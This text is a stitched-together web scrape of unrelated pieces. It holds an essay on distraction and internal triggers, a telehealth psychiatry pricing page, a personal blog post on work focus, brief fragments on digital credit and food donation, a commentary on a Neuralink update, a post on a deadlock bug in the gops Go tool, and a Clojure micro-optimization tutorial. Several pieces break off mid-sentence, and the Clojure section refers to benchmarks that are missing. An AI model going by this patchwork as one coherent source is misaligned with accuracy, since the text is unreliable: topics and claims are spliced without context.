<p>After I finished, I looked up and my daughter was gone. The worst part: before I became distracted, we had been playing a lovely game, telling each other what superpower we most wished for. It could have brought us closer together, but Iâ€™d just blown the spirit and substance of it big-time.</p>
<p>If youâ€™re a parent in the 21st century, I bet youâ€™ve experienced your own version of this. But itâ€™s not just parents, itâ€™s all of us in our interactions with each other. Distraction has become the norm. Weâ€™re blessed with pocket-sized supercomputers that connect us to anyone and everyone, and a buffet of information. But thereâ€™s a dark side: those same gadgets distract us, often at the moments that matter most.</p>
<p>Of course, smartphones didnâ€™t invent distraction â€“ theyâ€™re just the latest culprit. Before that, we blamed television. And before that, it was the telephone, or comic books, or the radio. Go back more than 2,000 years, and Socrates was even criticising the written word, for causing â€˜forgetfulness in the learnersâ€™ soulsâ€™.</p>
<p>Still, our present feels different, with the sources of distraction seeming greater in number and more ubiquitous. One <a href="https://journals.sagepub.com/doi/full/10.1177/0013916514539755">study</a> in 2014 showed that when two people are talking, the mere presence of a smartphone resting on a table is enough to change the character of their conversation. Thatâ€™s a tame example. To see the seriousness of the problem, look at the sobering <a href="https://www.nhtsa.gov/risky-driving/distracted-driving">statistics</a> on â€˜distracted drivingâ€™ in the United States.</p>
<p>After I abandoned my daughter and our game for an utterly inconsequential email, I realised I needed to deal with my distraction problem. First, I tried a popular approach: I blamed technology and made a serious attempt at a â€˜digital detoxâ€™. I bought a flip phone, subscribed to a print newspaper, and even purchased a 1990s-era word processor without an internet connection. I convinced myself that, once I banished all the technology from my life, Iâ€™d become the disciplined writer and focused father Iâ€™d always strived to be.</p>
<p>Talk about a rude awakening. Sitting at my ancient word processor, my eyes began to peer over to my now-tantalising bookshelf. â€˜Hmmm,â€™ I said to myself, â€˜I really should take a glance at this bookâ€™. Iâ€™d justify the distraction as necessary for â€˜researchâ€™. And if it wasnâ€™t reading, then Iâ€™d find something else â€“ the laundry that <em>needed</em> to be folded right now, my desk that <em>needed</em> to be tidied-up this minute. The technology wasnâ€™t distracting me. <em>I</em> was distracting me.</p>
<p>Thatâ€™s when I started a five-year journey to understand <a href="https://www.nirandfar.com/distractions/">distraction</a>, its causes and its cures. I discovered a great deal that I found surprising and counterintuitive, and I developed methods to deal with my distraction that actually worked â€“ and didnâ€™t involve me trying to turn back time and operate a flip phone. I realised that distraction often begins from within, not without, and found that the fix came from identifying and managing the psychological discomfort that leads us off track.</p>
<p>As often as not, distraction is your brain ducking challenging feelings such as boredom, loneliness, insecurity, fatigue and uncertainty. These are the internal triggers â€“ the <a href="https://www.nirandfar.com/kids-video-game-obsession/">root causes</a> â€“ that prompt you to find the comfort of distraction and open a browser tab, Twitter or email, instead of focusing on the matter at hand. Once you identify these internal triggers, you can decide to respond in a more advantageous manner. You wonâ€™t always be able to control how you feel â€“ but you can learn to control how you react to the way you feel. A trigger that once sent you to Twitter can perhaps lead instead to 10 deep breaths.</p>
<p>Distraction, in other words, is a symptom of a problem â€“ not the problem itself. Those deeper and systemic reasons â€“ such as an inability to cope with fear, anxiety or stress â€“ deserve our concern, because itâ€™s only when we start to address them that we can make real progress. When we begin to understand what weâ€™re trying to avoid by clicking over to Twitter or checking the news for the 10th time today, we can begin to address the issue itself, and not medicate it through more distraction. We also begin to appreciate how habitual the act of avoiding discomfort via distraction can be, and how much itâ€™s become a part of how we work and live.</p>
<p>The good news is that thereâ€™s something paradoxical about discomfort: itâ€™s actually the best tool we have for evolving and developing as a species. Feeling bad isnâ€™t actually bad; itâ€™s what helped us survive. Writing in 2001, the American psychologist Roy Baumeister and his colleagues <a href="https://psycnet.apa.org/record/2018-70020-001">observed</a>: â€˜If satisfaction and pleasure were permanent, there might be little incentive to continue seeking further benefits or advances.â€™ If we didnâ€™t feel bad, in other words, weâ€™d never achieve good.</p>
<p>Once you understand the depth of distraction, you can start to manage it and improve. After years of experiments, I found myself less distracted â€“ a quality that improved nearly every aspect of my life. It turns out that being able to focus on the subjects and people in my life who matter improved everything from my health to my happiness to my productivity. That can seem obvious, but I couldnâ€™t have fully appreciated the joys of living an indistractable life if I hadnâ€™t gotten there on my own after a five-year journey. Being indistractable can lead you to not just change your life for the better, but also experience life fully.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p><strong>Self-explore</strong></p>
<p>Identifying the triggers that made you feel bad in the first place requires self-exploration. When you notice yourself feeling distracted, pause and ask yourself what youâ€™re feeling. Are you worried? Are you afraid? Then go one step deeper. What caused the sensation? How does it feel in your body?</p>
<p>In exploring my own internal triggers, I began to appreciate that my anxiety about a project, which might lead me to find a tempting Wikipedia rabbit hole, was actually adaptive: the fact that I was anxious was good because it meant I was trying to become better. It was sometimes even as easy as saying to myself: â€˜Youâ€™re getting distracted right now because youâ€™re worried this wonâ€™t be up to snuff. Thatâ€™s okay. It means youâ€™re trying to do your best work, and thatâ€™s something to feel good about.â€™ It seems like a simple mental trick, but even that thought can have a profound influence in keeping you on track.</p>
<p>Thereâ€™s an interesting paradox about internal triggers: they can be big, imposing, powerful issues, and yet the fixes can sometimes be easy and quick. Hereâ€™s an example: letâ€™s say that an internal trigger when youâ€™re about to get started on a looming project is boredom. You just canâ€™t bring yourself to get excited about doing your taxes. And because you get bored, you get distracted. But if you know youâ€™re going to get bored, you can find ways to avoid the distraction that will soothe the boredom. For instance, if you set a time limit to work on the otherwise mind-numbing task that is so short, you wonâ€™t have a chance to get bored. Anyone can work on their taxes for just 10 minutes. This is called the <a href="https://www.nirandfar.com/strange-sex-habits-of-silicon-valley/">10-minute rule</a>, and itâ€™s an effective way to avoid distractions of all sorts. The point is to anticipate the internal trigger and then intercept it with a new routine rather than allowing yourself to slink away into doing something you didnâ€™t intend to do.</p>
<p>In the case of my interaction with my daughter, the internal trigger might have been anxiety about work or <a href="https://www.nirandfar.com/fomo/">fear of missing out</a> (on an email). But I can address both of those proactively, so that they donâ€™t interfere with precious daddy-daughter time. In the case of my work anxiety, I could make sure that someone on my team is monitoring incoming messages. I could put up an â€˜out of officeâ€™ email that encourages people to call me if thereâ€™s really an emergency. Or in reality, I could get comfortable with the discomfort that I might indeed be missing out on something, but thatâ€™s all right too. Any one of those is a better and more constructive response to the internal trigger than being distracted.</p>
<p>Whatever approach you take to address your inner triggers, itâ€™s encouraging to note that merely recognising uncomfortable feelings and identifying them could be beneficial. For instance, in a smoking-cessation <a href="https://www.sciencedirect.com/science/article/abs/pii/S0376871611002535?via%3Dihub">study</a>, researchers found that participants who learned to acknowledge and explore their cravings managed to quit smoking at double the rates of those in the American Lung Associationâ€™s best-performing cessation programme. Just identifying and investigating a craving had a tremendous impact.</p>
<p><strong>Reframe</strong></p>
<p>Once youâ€™ve identified the triggers, you can reframe the task at hand. Sure, you might be â€˜forced to do your taxesâ€™. But another way of thinking about that is that you â€˜get to review last yearâ€™s business successesâ€™. It sounds laughable, but it works. When I hit rough patches mid-book writing, I would say: â€˜I get to share this with my audience,â€™ as opposed to: â€˜I really have to work on the book today.â€™</p>
<p>Hereâ€™s one strategy: I found the fun in whatever I was doing. Yes, I know, this is where you roll your eyes, but hear me out. I learned to stay focused on the tedious work of writing books by looking for and finding the mystery embedded in my work. I wasnâ€™t â€˜writingâ€™, I was â€˜exploringâ€™. I wasnâ€™t Ernest Hemingway; I was Scooby-Doo. Research indicates that even the simple act of thinking of something that you donâ€™t enjoy as …</p></div></div></section></div></div>

A problem with nightmares that I've been having for nearly 8 years was immediately addressed when mentioned, and she was able to prescribe a non-narcotic medication to address the problem. I felt like she really listened to everything I said, and she was very easy to talk to and feel comfortable sharing private information with. She prescribed me medication for my ADD as well. I recommend her 10/10 times.”

                      Psychiatry appointments on average are $400+/hr.
                      </p><p>
                      Our initial appointments are $199. They last just 25 minutes since our providers review your information and think about your medical history ahead of time. The initial appointment is for listening to you, crafting a treatment plan together, and reviewing your goals. We don't waste your time.
                      </p><p>
                      After the initial appointments, our membership is just $59/mo. The membership includes follow-up appointments, access to our care team and providers, and convenient online refills. You may not require an appointment each month, but our providers will still review your medical history and progress that you may submit in order to issue an online refill.
                      </p><p>
                      Treatment costs are not included in these prices. Out of pocket costs for the treatment (without insurance) range from $40-80/mo. With insurance, it's just the copay.
                      </p><p>
                      We do not accept insurance for appointments or membership.

                      <br>Fill out and submit the medical questionnaire on the home page. Please answer truthfully as your provider will use your responses to understand your medical condition.
                      </p><p><strong>Step 2.</strong>
                      <br>After submitting the form, you may schedule an appointment directly with a provider of your choice.
                      </p><p>We require an additional questionnaire for medical history
                      </p><p><strong>Step 3.</strong>
                      <br>If treatment is issued, we can arrange to have it shipped to you for free. Or, if you prefer picking it up at a local pharmacy, you may ask your provider to send it there by providing the name, phone number, and address of the location.
                      </p><p><strong>Step 4.</strong>
                      <br>Now that your initial consultation is complete, you may become a member for just $59/mo.

Unfortunately, there are only two ways for that to happen on a work day: having all your meetings in the morning, or all in the afternoon. Most of the time, it doesnâ€™t work that way (see: <a target="_blank" rel="noopener noreferrer" href="https://aatishb.com/entropy/">entropy</a>).</p><p>This is bad (for me) for 2 reasons:</p><ul><li>Like Paul Graham said in <a target="_blank" rel="noopener noreferrer" href="http://www.paulgraham.com/makersschedule.html">Maker's Schedule, Manager's Schedule</a>, it takes time to get in the zone. The shorter each block of time to work, the larger percentage of time getting started, and the less total time spent moving the needle.</li><li>Getting into the zone is less enjoyable than being in the zone. If most of the time is spent getting in the zone, then the activity is overall less enjoyable. If itâ€™s less enjoyable, then that also makes it harder to get started later.</li></ul><ol start="2"><li>On-call nature</li></ol><p>You can get away with ignoring some emails and set up sophisticated filters for others but, at the end of the day, your inbox is a to-do list you donâ€™t control. Itâ€™s also dynamic, which means you have to keep an eye on it.</p><p>In that sense, I am on-call. Thus, I have a baseline level of anxiety that I'll be pulled out of the zone (or miss an email and irritate someone). That anxiety is heightened by that stupid red dot on the chat icon that never goes away, no matter how many times you check it.</p><ol start="3"><li>Separation from the real world</li></ol><p>Businesses, in order to make a profit, have to be efficient. Hence, each part of the business (particularly each employee) tends towards specialization. The chaos of reality is subdued by categories and protocols. Unless you're at the front lines (e.g. as a sales person or customer service), only a few nitty-gritty pieces of â€œthe real worldâ€� make it down the pipeline to you. Itâ€™s easy to forget that the customers even exist. Working like this feels sterile - like filling out a form at the DMV.</p><p>This is, selfishly, why I don't like donating money to charities. I'm too detached from the process and outcome. It feels like I'm just tossing money into a black hole.</p><h2 id="how-im-coping"><p>How Iâ€™m Coping<a aria-label="anchor" href="#how-im-coping">#</a></p></h2><p>The company environment and processes are difficult for a person at the bottom of the totem pole (i.e. me) to influence, but it's important to note that they're not the problem per se. There is really one core problem: getting past the emotional friction (from the reasons earlier) in order to actually start.</p><p>I've found that a workaround solution is simply removing AS MUCH ambiguity as possible. For any task that I am assigned, I try to make sure I don't walk away without knowing two things:</p><ol><li><p><strong>What is brain-dead step 1</strong>? When I say brain-dead, I want to be able to accomplish the task absolutely wasted drunk. For example, "start reading ABC documentation" is not specific enough. I need something like</p><ul><li>open up the Chrome browser</li><li>go to X URL</li><li>press Y menu button</li><li>click Z option</li></ul></li></ol><p>If I'm fighting lots of psychological resistance, compliance is so much easier if the next step is blatantly obvious and only takes seconds.</p><ol start="2"><li><strong>Where is the light at the end of the tunnel</strong>? The only thing worse than having trouble getting started is having trouble <em>staying</em> started. I might be able to accomplish the herculean task of getting started, but if I have to keep sustaining that same effort to stay there, I'm basically done for. I need to achieve some degree of flow, and that involves culling ambiguity that could roadblock me.</li></ol><h2 id="a-long-term-solution"><p>A Long Term Solution<a aria-label="anchor" href="#a-long-term-solution">#</a></p></h2><p>Here is an attempt to enumerate my wish list:</p><ul><li>Long periods of uninterrupted time to think.</li><li>Communication with other people (e.g. stakeholders) is predictable and batched.</li><li>A visceral intimacy with my domain (i.e. proximity to â€œthe real worldâ€�).</li></ul><p>By that last bullet, I mean a deep and comprehensive understanding that comes from close attunement and having skin in the game.</p><p>The archetype I'm imagining is a scientist who studies volcanoes. Every once in a while, they take a trip to a volcano to observe it first hand - literally feeling it beneath their feet. However, they don't actually set up their office there, where the scientist is subject to eruptions and other agents of disorder. They go back to their lab, shut the door, and go heads-down examining samples, running simulations, doing math, etc.</p><p>An obvious question: Why not become a scientist?</p><p>I've thought about it, but my biggest problem is that, based on past experience, I don't think it's a good idea for me to commit to spending 4-6 years thinking about 1 thing (i.e. a PhD). I have lots of unfinished projects that I abandoned. Interest was high at first, but waned. Simultaneously, my interest in something else increased, so I jumped ship. Rinse-and-repeat.</p><p>I've tried making myself stay on one path, but it never stuck long term. I've found that it's far more productive for me to do lots of successive short-term projects - for example, blog posts like this one or JIRA tickets as an engineer.</p><p>In any case, my hypothesis right now is that Iâ€™d be most happy providing value to the world by creating content based on whatever has my attention at that time. For example, if Iâ€™m currently entransed by Chapter 13 of some math textbook, then maybe I could whip up a blog post explaining it. I could make it more attractive by adding interactive dials for user experimentation and/or some copy pertaining to why itâ€™s important. Iâ€™m not sure I could make a living off that, though. Plus, Iâ€™m happy that Iâ€™m at least doing work thatâ€™s meaningful, even if it doesn't feel that way.</p><br></article></div>]]>

So this led to a surge in “digital credit” banking led by the private sector in low-income countries, which is increasing financial inclusion for people without formal credit.</p><p>China takes this up a notch with <a rel="noreferrer noopener" href="https://www.smartcitylab.com/blog/inclusive-sharing/can-big-data-eradicate-poverty/" target="_blank">a cloud computing platform to monitor the financial health of 6 million people living in poverty in 9,000 villages in Guizhou province</a>.

The problem that MEANS is attempting to solve is the mismatch of food between what food kitchens and charities need, and what is being given to them.</p><p>For example, 10,000 packets of sugar-laden Pop-Tarts are given to a charity with mostly diabetic members. In cases where large amounts of the wrong food are given to the wrong people, the food end up being disposed and that sucks.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of the most anticipated general public neurotech events of the year happened last Friday: Neuralink’s second yearly update. Although last week was a particularly eventful one for neuroscience, with major announcements from multiple key players in the field, Elon Musk commands a level of attention unlike anyone else (warranted or not). So today we’ll focus on Neuralink and the technology they unveiled.
</p><p>
<b>The Neuralink system</b><br>
The system Neuralink presented during Friday's event is an evolution of the system they unveiled a year ago. Instead of implanting a single array of rigid electrodes into the brain, as is more common, their system inserts individual threads using a device reminiscent of a sewing machine. Indeed, a significant share of their efforts has been geared towards building a medical robot (i.e. the sewing machine) capable of quickly and precisely inserting the soft and flexible electrode threads into the brain. Individual threads are then connected to a custom chip that filters and compresses the recorded neural data, before sending it out through a low energy Bluetooth connection to a smartphone. A single chip can connect to around fifty to a hundred threads, each with multiple independent contacts, for a total of a thousand individual recording (and stimulation) sites. One of the major changes in the newly unveiled “second generation” device is that the entire system fits inside a capsule about the diameter of a quarter dollar coin, albeit five times thicker (2.3cm in diameter and 0.8cm thick). This package is meant to replace the piece of skull removed during surgery. In other words, a coin-sized hole is drilled into the skull, the electrodes are inserted into the brain using a robotic sewing machine, and then the hole in the bone is plugged with the device rather than the removed piece of skull. This allows for an elegant implant with limited wiring and no transcutaneous connectors. Of note, the surgical robot has also been significantly streamlined and improved, presumably moving it closer to something that could be used in an operating room and on humans. However, details were scarce, making it hard to evaluate any of these changes accurately. The short version is that the technology was very much in line with what had been shown last year, only improved, as can be expected of a company iterating towards a commercial product.
</p><p>
<b>A presentation light on details</b><br>
After their presentation last year, Neuralink received considerable backlash from the scientific community for excessive hype and failing to recognise similar existing technologies. While hype was still available in spades this year, there was in my view an effort to somewhat scale down ambitions. For example, Neuralink’s mission was stated in much more concrete terms this year: "The purpose of Neuralink is to solve important brain and spine problems." While there had certainly been talk of neurological disorders last year too, they had been overshadowed by very aspirational and futuristic mission statements within the first 5 minutes of the talk, including the distant idea of healthy people using brain interfaces to "achieve a symbiosis with artificial intelligence”. These ideas still made it onto the stage this year, but only later in the event during the speculative part of the Q&amp;A session. Similarly, engineering efforts have been refocused and concretised. Last year’s plan of implanting 4000 channels in their first human participant appears to have been scaled down to a single 1024 channel device. This brings them much closer to the roughly 250 channels currently implanted in human participants enrolled in research studies, including at the University of Pittsburgh where I currently work.
</p><p>
While some neuroscientists are allergic to the hype and the grandiose statements Elon Musk is known for, it’s important to remember that Neuralink isn’t a research lab—it's a Silicon Valley startup. Their event had over a hundred thousand live streamers (despite being the middle of the night in Europe), and the video has since amassed over 2 million views. That’s a big reach—this was no scientific conference talk. A startup’s CEO needs to straddle the line between realistic short term goals and an overarching mesmerising vision to recruit talent and raise money. It’s the same duality that leads to sharing images of towns on Mars (perhaps even with a human-made atmosphere) all while building the world’s most advanced rockets. In Neuralink’s case, there is the added ethical danger of presenting treatments that clearly won't exist for decades, raising false hopes in people afflicted by neurological disorders. However, by offering no explicit timelines or plans, Neuralink is making no promises, only engaging in long term speculation. The same way we can trust people not to sell their homes in preparation for a move to Mars, we should trust them not to take dramatic health decisions based on 20 minutes of sci-fi thought experiments and speculation.
</p><p>
Neuralink’s scientific and engineering merits ought to be judged on the systems it produces, not its storytelling. That is what I will try to do here. Since there is  simply not enough information to make a thorough evaluation—educated guesses will have to do.
</p><p>
<b>Neuralink’s strength is not science, it’s engineering</b><br>
Despite the aforementioned lack of details, a few laudable achievements were on display at Friday's event. The biggest was a demonstration that Neuralink's new device (Neuralink’s Neuralink?) works in vivo (in pigs), and did so for two months. The ability to wirelessly stream from 1024 cortical channels in a freely behaving animal is a big step in the right direction and a demonstration of what money and a talented team can deliver. The same is true of another extremely well-funded neurotechnology startup: Kernel, as <a href="https://edoardodanna.ch/article/thoughts_on_kernel_announcement"> I discussed after their last announcement</a>. In both cases, the real breakthrough is the ability to take existing prototypes from research labs and integrate them into a well designed and engineered product. The robot and implantable system Neuralink showcased are more polished than anything currently available, even if none of the individual ideas or components is completely novel. At the end of the day, execution is what matters. The history of technology is littered with examples of companies successfully combining existing ideas and prototypes into compelling  products and popularising them (e.g. Apple’s first successful point and click user interface, which borrowed from Xerox's PARC in-house prototypes).
</p><p>
<b>The biggest challenges still lie ahead</b><br>
While the engineering progress is impressive, where Neuralink still needs to do some convincing is on the science. What we have seen so far is excellent execution of things we knew could be done (miniaturisation, wireless system, surgical robot, etc). The next steps for Neuralink will increasingly involve tackling unsolved scientific challenges, which are an entirely different flavour of problem. Science is much harder to rush, it's less amenable to a startup’s timeline. For instance, Neuralink currently uses thin-film based electrodes, which have yet to demonstrate long term viability in academic labs (where they are extensively studied and have been for some time). Thin films have interesting properties such as very small sizes, high mechanical flexibility, and well-established fabrication processes, which make them well suited for brain implants. But their long term stability remains a looming challenge. So far Neuralink has demonstrated their electrodes can work for 2 months in pigs. That’s a long shot from showing they can work for five or ten years in humans. As Matt Angle, the CEO of another high profile neurotech startup called Paradromics, recently put it: “if you want to test whether something can last 10 years, you really have to wait 10 years.”
</p><p>
The other big challenge is what to do with a thousand channels once they are implanted and stable. Many of the applications mentioned in the presentation are plausible and actively researched (e.g. <a href="https://www.sciencedirect.com/science/article/pii/S0006899314015674">stimulation of visual cortex to restore sight</a>, <a href="https://stm.sciencemag.org/content/8/361/361ra141?__hstc=12316075.07430159d50a3c91e72c280a7921bf0d.1525132800142.1525132800143.1525132800144.1&amp;__hssc=12316075.1.1525132800145&amp;__hsfp=1773666937">stimulation of the somatosensory cortex to restore touch</a>, etc). But each of these is an active area of research full of unanswered questions. Having a thousand channels instead of a few hundred will not significantly change the game. For instance, we know that electrically stimulating any of these sensory areas can elicit corresponding percepts (e.g. localised flashes of light when stimulating the visual cortex). But these sensations are often crude replicas of their natural counterparts, with limited spatial resolution, unnatural qualities and limited dynamic range. While one can extrapolate from these results and imagine a future where improved artificial sensations become practical and useful, it will take a lot more than increasing the number of available channels by one or even two orders of magnitude. 
</p><p>
Talking only about stimulation is perhaps a little unfair, since it's the less advanced side of the neural interface coin. Recording information from the brain is much better understood, especially for motor areas, as illustrated by <a href="https://iopscience.iop.org/article/10.1088/1741-2560/12/1/016011/meta">this study</a> from the University of Pittsburgh where a brain implant is used to control a robot with 10 degrees of freedom. Neuralink's first demonstration will likely be to help a paralysed person control a computer with their mind, or perhaps even a robotic device of some kind (this second one is less likely because of the added complexity). Concretely, a system like this could allow the user to interact with a computer by controlling a cursor (i.e. point and click) and input text (either by using a virtual keyboard, or perhaps a more cutting-edge approach like the one I discussed in <a href="https://edoardodanna.ch/article/brain_calligraphy">a recent post</a>). On top of that, the user could control a few additional virtual “buttons”. In other words, the first Neuralink product could be a virtual brain-steered controller, with a joystick, three or four buttons and a speech …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Even in Go, concurrency is still not easy (with an example)</h2>

	<p><small>September  1, 2020</small></p>
</div><div><p>Go is famous for making concurrency easy, through good language
support for <a href="https://golangbot.com/goroutines/">goroutines</a>. Except
what Go makes easy is only one level of concurrency, the nuts and
bolts level of making your code do things concurrently and communicating
back and forth through channels. Making it do the right things
concurrently is still up to you, and unfortunately Go doesn't
currently provide a lot of standard library support for correctly
implemented standard concurrency patterns.</p>

<p>For example, one common need is for a limited amount of concurrency;
you want to do several things at once, but only so many of them.
At the moment this is up to you to implement on top of goroutines,
channels, and things like the <a href="https://golang.org/pkg/sync/"><code>sync</code></a>
package. This is not as easy as it looks, and quite competent people
can make mistakes here. As it happens, I have an example ready to
hand today.</p>

<p><a href="https://github.com/google/gops">Gops</a> is a convenient command to
list (and diagnose) Go processes that are currently running on your
system. Among other things, it'll tell you which version of Go they
were compiled with, which is handy if you want to see if you have out
of date binaries that should be rebuilt and redeployed. One of the
things <code>gops</code> needs to do is look at all of the Go processes on your
system, which it does concurrently. However, it doesn't want to look
at too many processes at once, because <a href="https://github.com/google/gops/pull/118">that can cause problems with
file descriptor limits</a>. This
is a classic case of <em>limited concurrency</em>.</p>

<p>Gops implements this at the moment with code in <a href="https://github.com/google/gops/blob/6fb0d860e5fa50629405d9e77e255cd32795967e/goprocess/gp.go#L29">goprocess.FindAll()</a>
that looks like this, in somewhat sketched and reduced form:</p>

<blockquote><pre>func FindAll() []P {
   pss, err := ps.Processes()
   [...]
   found := make(chan P)
   limitCh := make(chan struct{}, concurrencyProcesses)

   for _, pr := range pss {
      limitCh &lt;- struct{}{}
      pr := pr
      go func() {
         defer func() { &lt;-limitCh }()
         [... get a P with some error checking ...]
         found &lt;- P
      }()
   }
   [...]

   var results []P
   for p := range found {
      results = append(results, p)
   }
   return results
}
</pre>
</blockquote>

<p>(In the real code there's a WaitGroup for coordination, and the
<code>found</code> channel gets closed appropriately.)</p>

<p>How this works is clear, and is a standard pattern (covered in eg
Go 101's <a href="https://go101.org/article/channel-use-cases.html">Channel Use Cases</a>). We use a
buffered channel to provide a limited number of tokens; sending a
value into the channel implicitly takes a token (and blocks if the
token supply is exhausted), while receiving a value from it puts a
token back in. We take a token before we start a new goroutine, and
the goroutine releases the token when it's done.</p>

<p>Except that <a href="https://github.com/google/gops/issues/123">this code has a bug if there are too many processes
to examine</a>. Even knowing
that there is a bug in this code, it may not be obvious.</p>

<p>The bug is that the goroutines only receive from <code>limitCh</code> to release
their token after sending their result to the unbuffered <code>found</code>
channel, while the main code only starts receiving from <code>found</code>
after running through the entire loop, and <strong>the main code takes
the token in the loop and blocks if no tokens are available</strong>. So
if you have too many processes to go through, you start N goroutines,
they all block trying to write to <code>found</code> and don't receive from
<code>limitCh</code>, and the main <code>for</code> loop blocks trying to send to <code>limitCh</code>
and never reaches the point where it starts receiving from <code>found</code>.</p>

<p>At one level, this bug is a very fragile bug; it only exists because
of multiple circumstances. If the goroutines took the token by
sending to <code>limitCh</code> instead of the main <code>for</code> loop doing it, the
bug would not exist; the main <code>for</code> loop would start them all, many
would stop, and then it would go on to receive from <code>found</code> so that
they could receive from <code>limitCh</code> and release their token so other
goroutines would run. If the goroutines received from <code>limitCh</code> to
release their token before sending to <code>found</code>, it wouldn't exist
(but because of error handling, it's simpler and more reliable to
do the receive in a <code>defer</code>). And if the entire <code>for</code> loop was in
an additional goroutine, the main code would go on to receive from
<code>found</code> and unblock completed goroutines to release their tokens,
so the fact that the <code>for</code> loop was blocked waiting to send to
<code>limitCh</code> wouldn't matter.</p>

<p>At another level, this shows how concurrency is not easy as easy
as it looks in Go. All you need is one mistake and things skid to
a halt, and all of the code involved can look good to a casual
examination. Getting concurrency correct is simply hard for people
(we can debate about why, but I think that it is is very clear).</p>

<p>(I'm sure that the people who wrote and approved the change that
added this concurrency limiting code to gops were good programmers.
A tricky case still tripped them up, passing all of their scrutiny.
Even when I knew that there was a concurrency problem in the code
and where it was (because my <code>gops</code> was hanging all of a sudden,
and <a href="https://github.com/go-delve/delve">Delve</a> told me where
everything was stuck), it still took me some time to see what the
exact problem was.)</p>

<p>Dynamic, functional programming languages like Clojure are sometimes considered “slower” than their statically-typed and/or OO counterparts, due to facilities like dynamic function dispatch and immutable-orientation, etc. But this comparison is too general. </p>



<p>Clojure is <em>readily</em> optimizable in cases where utmost performance is key. Clojure embraces the “Get it working, then make it fast” approach to building up a software system—even large-scale systems with high performance demands<a href="#footnotes" data-type="internal" data-id="#footnotes">¹</a>.</p>



<p>This post is about micro-optimizing Clojure code: how can we improve our Clojure code performance on the JVM when we need it the most, when hot code paths and tight loops prevail—for example, in large-scale data processing systems.</p>



<p>General JVM performance, benchmarking, and tuning is a broad and deep skillset and there are many more considerations beyond Clojure. The focus here is Clojure-specific.</p>



<ul><li><a href="#clojure-performance-tools" data-type="internal" data-id="#clojure-performance-tools">Clojure Performance Tools</a></li><li><a href="#avoiding-laziness">Avoiding Laziness</a></li><li><a href="#first-and-last">first and last</a></li><li><a href="#equiv-equals">equiv and equals</a></li><li><a href="#dynamic-vars">Dynamic Vars vs. ThreadLocal</a></li><li><a href="#clojure-transients">Clojure Transients</a></li><li><a href="#dramatic-gains-with-type-hinting">Dramatic Gains with Type Hinting</a></li><li><a href="#destructuring" data-type="internal" data-id="#destructuring">The Cost of Destructuring</a></li><li><a href="#benchmarking-with-jmh" data-type="internal" data-id="#benchmarking-with-jmh">Benchmarking with JMH</a></li><li><a href="#final-notes">Final Notes</a></li></ul>







<p>Before we get to our specific list of Clojure optimizations, we should emphasize that running your own benchmark and profiling experiments is essential to producing specific top-level performance outcomes for your own code and domain.</p>



<p>You could follow all of the advice in this post, shower your code with type hints, remove laziness and sequences, etc, etc, and⁠ without a <em>specific</em> performance model for where your costs are coming from and how to measure improvement, it is possible or even likely to see no dip in your processing latencies or reduction in your cloud bill<a href="#footnotes">²</a>.</p>



<p>We recommend the following tools for performing your own analyses; these were all used in developing this post:</p>



<ul><li><a href="https://github.com/hugoduncan/criterium">criterium</a> A benchmarking tool that is a Clojure industry-standard at this point; most of the relative benchmarks in this post are generated from the REPL using criterium.</li><li><a href="https://github.com/clojure-goes-fast/clj-async-profiler">clj-async-profiler</a> For minimal quick and dirty Clojure profiling. REPL-enabled.</li><li><a href="https://github.com/gtrak/no.disassemble">no.disassemble</a> For inspecting Clojure-compiled byte code from the REPL. (If you’re familiar with <a href="https://docs.oracle.com/javase/8/docs/technotes/tools/windows/javap.html">javap</a>, the output is what you would see from decompiling classes using javap -c on the command-line, except you can see what a compiled Clojure function looks like.)</li><li><a href="http://openjdk.java.net/projects/code-tools/jmh/">jmh</a> (Java Microbenchmark Harness) A feature-rich benchmarking toolkit for the JVM. Its usage is heavily Java/annotation-based (so not REPL-friendly) but it has an expressive feature set, making it possible to run more specialized<a href="http://hg.openjdk.java.net/code-tools/jmh/file/4a420afe8a9e/jmh-samples/src/main/java/org/openjdk/jmh/samples/JMHSample_30_Interrupts.java"> </a>benchmarks such as <a href="http://hg.openjdk.java.net/code-tools/jmh/file/4a420afe8a9e/jmh-samples/src/main/java/org/openjdk/jmh/samples/JMHSample_30_Interrupts.java">ones</a> that could deadlock (and many others; see <a href="http://hg.openjdk.java.net/code-tools/jmh/file/tip/jmh-samples/src/main/java/org/openjdk/jmh/samples/">here</a>.) We find it essential in carrying out a comprehensive benchmarking analyses and we’ll demonstrate out how to use it with Clojure a bit later on.</li></ul>



<h2 id="avoiding-laziness">Avoiding Laziness</h2>



<p>Clojure’s sequence abstraction and laziness are powerful programming facilities but we must shy away from these tools when memory and compute are in high demand. </p>



<p>Why? Lazy implementations require generating&nbsp;<em>per-element&nbsp;</em>state and this can be substantial overhead when compared to non-lazy alternatives like arrays and vectors whose elements each contribute just their own value’s size to memory.</p>



<p>Accordingly there is computation overhead in laziness due to this per element construction; compare lazy implementations of map and filter to transform values in a vector with a non-lazy (<a href="https://clojure.org/reference/transducers">transducer</a>-based) alternative:</p>

<p>into has first-class transducer support; the same over-<em>2x</em> gains follow when using transducers + transduce in favor of laziness + reduce.</p>



<p>Avoid laziness where scale matters.</p>



<h2 id="first-and-last">first and last</h2>



<p>This one is particularly frustrating. We might expect <a href="https://clojuredocs.org/clojure.core/first">first</a> and <a href="https://clojuredocs.org/clojure.core/last">last</a> to have special consideration of their provided type. But this is not the case; they are implemented over Clojure’s lazy sequence API without respect of type. Even with a vector, last will obtain the result using a full linear pass over the data. Both first and last <a href="https://clojuredocs.org/clojure.core/seq">seq</a> the input unnecessarily which is additional computation cost.</p>



<p>Of course we have a way out⁠—but the moral of the story is to stay well away from first and last when optimal performance is required. Here’s a full sequence of benchmarks; notice the dramatic relative cost of first and last on vectors. Pick the latencies you like the best:</p>

<p>Edit: Clojure’s <a href="https://clojuredocs.org/clojure.core/peek">peek</a> will answer the last item of a vector optimally. The benchmark for peek matches precisely the mean execution time of nth + .length in the last benchmark above. [<a href="https://twitter.com/puredanger/status/1301269975819341826">Credit</a>]</p>



<h2 id="equiv-equals">equiv and equals</h2>



<p>An occasional need in high-performing applications is a read-heavy, in-memory cache or value registry, commonly with some kind of composite/tuple for its map keys. It turns out that the choice of datatype (for both map and key) are… erm… key here.</p>



<p>Consider the following benchmarks for a simple map lookup using different combinations of map type (Clojure’s PersistentHashMap vs. Java’s HashMap) and composite key type.</p>



